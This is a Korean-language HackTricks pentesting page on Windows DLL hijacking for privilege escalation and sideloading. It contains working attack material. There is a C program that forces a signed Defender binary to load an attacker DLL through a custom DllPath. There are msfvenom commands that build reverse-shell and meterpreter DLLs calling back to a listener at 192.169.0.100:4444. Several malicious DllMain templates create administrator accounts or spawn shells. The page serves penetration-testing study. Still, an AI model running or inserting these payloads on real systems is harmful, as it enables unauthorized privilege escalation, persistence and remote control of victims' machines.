# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## 기본 정보

DLL Hijacking은 신뢰되는 애플리케이션이 악성 DLL을 로드하도록 조작하는 것을 포함합니다. 이 용어는 **DLL Spoofing, Injection, and Side-Loading** 같은 여러 전술을 포괄합니다. 주로 코드 실행, 지속성 확보에 사용되며, 드물게 권한 상승에 이용됩니다. 여기서는 권한 상승에 초점을 맞추었지만, hijacking 방법 자체는 목적에 상관없이 동일합니다.

### 일반적인 기법

응용프로그램의 DLL 로딩 방식에 따라 효과가 달라지는 여러 방법이 사용됩니다:

1. **DLL Replacement**: 정품 DLL을 악성 DLL로 교체하고, 원본 DLL의 기능을 유지하기 위해 선택적으로 DLL Proxying을 사용할 수 있습니다.
2. **DLL Search Order Hijacking**: 악성 DLL을 정식 DLL보다 먼저 검색되는 경로에 배치하여 악용합니다.
3. **Phantom DLL Hijacking**: 애플리케이션이 필요로 하지만 존재하지 않는 DLL로 판단하도록 악성 DLL을 생성하여 로드되게 합니다.
4. **DLL Redirection**: `%PATH%`나 `.exe.manifest` / `.exe.local` 파일 같은 검색 매개변수를 수정해 애플리케이션이 악성 DLL을 찾도록 유도합니다.
5. **WinSxS DLL Replacement**: WinSxS 디렉터리의 정식 DLL을 악성 DLL로 대체하는 방법으로, 종종 DLL side-loading과 관련됩니다.
6. **Relative Path DLL Hijacking**: 복사한 애플리케이션과 함께 공격자가 제어할 수 있는 디렉터리에 악성 DLL을 배치하는 방식으로, Binary Proxy Execution 기법과 유사합니다.

## 누락된 Dll 찾기

시스템 내 누락된 Dll을 찾는 가장 일반적인 방법은 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) (sysinternals) 를 실행하고, **다음 2개의 필터**를 설정하는 것입니다:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

그리고 **File System Activity**만 표시합니다:

![](<../../images/image (314).png>)

일반적으로 **누락된 dll을 찾는 경우**에는 이 상태로 몇 **초** 동안 실행해 둡니다.\
특정 실행 파일 내에서 **누락된 dll을 찾는 경우**에는 **"Process Name" "contains" "\<exec name>"** 같은 추가 필터를 설정하고, 실행한 다음 이벤트 캡처를 중지해야 합니다.

## 누락된 Dll 악용하기

권한 상승을 위해 가장 유리한 상황은 **권한이 높은 프로세스가 로드하려고 시도할 DLL을 쓸 수 있는 위치에 쓰는 것**입니다. 따라서 DLL이 원본 DLL이 있는 폴더보다 먼저 검색되는 폴더에 DLL을 **쓰기**할 수 있거나(드문 경우), DLL이 검색되는 폴더 중 하나에 쓸 수 있고 원본 **dll이 어느 폴더에도 존재하지 않는** 경우가 최선입니다.

### Dll 검색 순서

[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)에서 DLL이 어떻게 로드되는지 구체적으로 확인할 수 있습니다.

Windows 애플리케이션은 미리 정의된 검색 경로 집합을 따라 DLL을 찾으며, 특정 순서를 따릅니다. 악성 DLL이 이러한 디렉터리 중 하나에 전략적으로 배치되면 정품 DLL보다 먼저 로드되어 DLL hijacking이 발생할 수 있습니다. 이를 방지하는 한 가지 방법은 애플리케이션이 필요로 하는 DLL을 참조할 때 절대 경로를 사용하도록 하는 것입니다.

다음은 32-bit 시스템에서의 DLL 검색 순서입니다:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

이는 **SafeDllSearchMode**가 활성화된 기본 검색 순서입니다. 이 기능이 비활성화되면 현재 디렉터리의 우선순위가 두 번째로 상승합니다. 이 기능을 비활성화하려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 생성하고 0으로 설정하면 됩니다(기본값은 활성화).

만약 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH** 플래그와 함께 호출되면, 검색은 **LoadLibraryEx**가 로드하는 실행 모듈의 디렉터리에서 시작합니다.

마지막으로, **절대 경로**로 DLL을 지정하면 그 DLL은 **오직 그 경로에서만** 검색됩니다(해당 DLL이 다른 종속성을 갖는 경우, 그 종속성들은 이름으로 로드된 것처럼 검색됩니다).

검색 순서를 변경하는 다른 방법들도 있지만 여기서는 설명하지 않겠습니다.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

새로 생성되는 프로세스의 DLL 검색 경로에 결정적으로 영향을 주는 고급 방법은 ntdll의 네이티브 API로 프로세스를 생성할 때 RTL_USER_PROCESS_PARAMETERS의 DllPath 필드를 설정하는 것입니다. 여기서 공격자가 제어하는 디렉터리를 제공하면, 대상 프로세스가 DLL을 이름으로(절대 경로 없이, 안전 로드 플래그를 사용하지 않고) 해결할 때 해당 디렉터리에서 악성 DLL을 로드하도록 강제할 수 있습니다.

핵심 아이디어
- RtlCreateProcessParametersEx로 프로세스 매개변수를 구성하고, 제어하는 폴더(예: dropper/unpacker가 있는 디렉터리)를 가리키는 커스텀 DllPath를 제공합니다.
- RtlCreateUserProcess로 프로세스를 생성합니다. 대상 바이너리가 DLL을 이름으로 해결할 때 로더는 이 제공된 DllPath를 참조하여, 악성 DLL이 대상 EXE와 동일 디렉터리에 있지 않아도 신뢰성 있는 sideloading이 가능해집니다.

참고/제한사항
- 이것은 생성되는 자식 프로세스에 영향을 미치며, 현재 프로세스에만 영향을 주는 SetDllDirectory와는 다릅니다.
- 대상은 이름으로 DLL을 import하거나 LoadLibrary해야 합니다(절대 경로가 아니고 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories를 사용하지 않을 것).
- KnownDLLs와 하드코딩된 절대 경로는 hijack할 수 없습니다. Forwarded exports와 SxS는 우선순위를 변경할 수 있습니다.

Minimal C example (ntdll, wide strings, simplified error handling):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
운영 사용 예시
- 악성 xmllite.dll(필요한 함수를 export하거나 실제 DLL로 프록시하는)을 DllPath 디렉토리에 배치합니다.
- 위 기법을 사용하여 이름으로 xmllite.dll을 조회하는 것으로 알려진 서명된 바이너리를 실행합니다. 로더는 제공된 DllPath를 통해 임포트를 해결하고 당신의 DLL을 sideloads 합니다.

이 기법은 실제 환경에서 multi-stage sideloading chains를 발생시키는 데 사용되는 것이 관찰되었습니다: 초기 런처가 helper DLL을 드롭하고, 그 후 해당 DLL이 custom DllPath로 Microsoft-signed인 hijackable 바이너리를 실행시켜 스테이징 디렉토리에서 공격자의 DLL을 강제 로드하도록 합니다.


#### Windows 문서에서의 dll 검색 순서 예외사항

Windows 문서에는 표준 DLL 검색 순서의 특정 예외사항이 명시되어 있습니다:

- 이미 메모리에 로드된 것과 같은 이름을 가진 **DLL that shares its name with one already loaded in memory**이 발견되면, 시스템은 일반적인 검색을 건너뜁니다. 대신 리디렉션과 manifest를 확인한 후 메모리에 이미 있는 DLL을 기본으로 사용합니다. **In this scenario, the system does not conduct a search for the DLL**.
- 해당 DLL이 현재 Windows 버전에서 **known DLL**로 인식되는 경우, 시스템은 그 버전의 known DLL과 그에 종속된 DLL들을 사용하여 **forgoing the search process**합니다. 레지스트리 키 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**에는 이러한 known DLL들의 목록이 저장되어 있습니다.
- **DLL have dependencies**가 있는 경우, 이러한 종속 DLL들의 검색은 초기 DLL이 전체 경로로 식별되었는지 여부와 관계없이 마치 **module names**로만 지정된 것처럼 수행됩니다.

### Escalating Privileges

**Requirements**:

- 서로 다른 권한으로 실행되거나 실행될 (horizontal or lateral movement) 프로세스 중에서 **DLL이 없는** 것을 식별합니다.
- **DLL**이 **검색될** 어떤 **directory**에 대해서든 **write access**가 가능한지 확인합니다. 이 위치는 실행 파일의 디렉터리이거나 시스템 경로 내의 디렉터리일 수 있습니다.

네, 요구 조건을 찾는 것은 까다롭습니다 — **기본적으로 권한이 있는 실행 파일이 dll을 누락한 상태로 존재하는 것을 찾는 것은 좀 이상하고**, 시스템 경로 폴더에 쓰기 권한이 있는 것은 **더욱 이상합니다**(기본적으로는 불가능합니다). 하지만 잘못 구성된 환경에서는 이 조건이 성립할 수 있습니다.\
운이 좋아서 요구사항을 충족하는 경우, [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인해 보세요. **main goal of the project is bypass UAC** 이긴 하지만, 해당 Windows 버전에 맞는 Dll hijaking의 **PoC**를 찾을 수 있으며(아마도 쓰기 권한이 있는 폴더의 경로만 변경하면 됨) 활용할 수 있습니다.

참고로 폴더에서 **권한을 확인하는 방법**은 다음과 같습니다:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
그리고 **PATH 내부의 모든 폴더 권한을 확인하세요**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
또한 다음 명령어로 executable의 imports와 dll의 exports를 확인할 수 있습니다:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)은 system PATH 내의 어떤 폴더에 쓰기 권한이 있는지 확인합니다.\
이 취약점을 찾기 위한 다른 흥미로운 자동화 도구로는 **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 및 _Write-HijackDll_가 있습니다.

### Example

취약한 시나리오를 찾은 경우, 이를 성공적으로 악용하기 위해 가장 중요한 것 중 하나는 **실행 파일이 해당 DLL에서 import할 모든 함수들을 최소한으로 export하는 dll을 생성하는 것**입니다. 어쨌든, Dll Hijacking은 [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) 또는 [ **High Integrity to SYSTEM**](#from-high-integrity-to-system)**.** 예제로 **유효한 dll을 만드는 방법**은 이 실행을 위한 dll hijacking 연구에서 확인할 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
또한, 다음 섹션에서는 **템플릿으로 유용하거나** 필수적이지 않은 함수들을 export하는 **dll을 만들 때 사용할 수 있는 몇 가지 기본 dll 코드들**을 찾을 수 있습니다.

## **Creating and compiling Dlls**

### **Dll Proxifying**

기본적으로 **Dll proxy**는 로드될 때 **악성 코드를 실행할 수 있으면서**, 동시에 **실제 라이브러리로의 모든 호출을 중계(relay)하여** 기대되는 대로 **노출되고 동작하는** Dll입니다.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus) 도구를 사용하면 대상 실행 파일을 지정하고 프록시화할 라이브러리를 선택해 **프록시화된 dll을 생성**하거나, Dll을 지정해 **프록시화된 dll을 생성**할 수 있습니다.

### **Meterpreter**

**rev shell (x64) 얻기:**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) 얻기:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**사용자 생성(x86 — x64 버전은 확인하지 못함):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 직접 만든 경우

여러 경우에 컴파일하는 Dll은 피해자 프로세스가 로드할 여러 함수를 반드시 **export several functions** 해야 합니다. 이러한 함수들이 존재하지 않으면 **binary won't be able to load** them, 그리고 **exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## 참고자료

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../banners/hacktricks-training.md}}
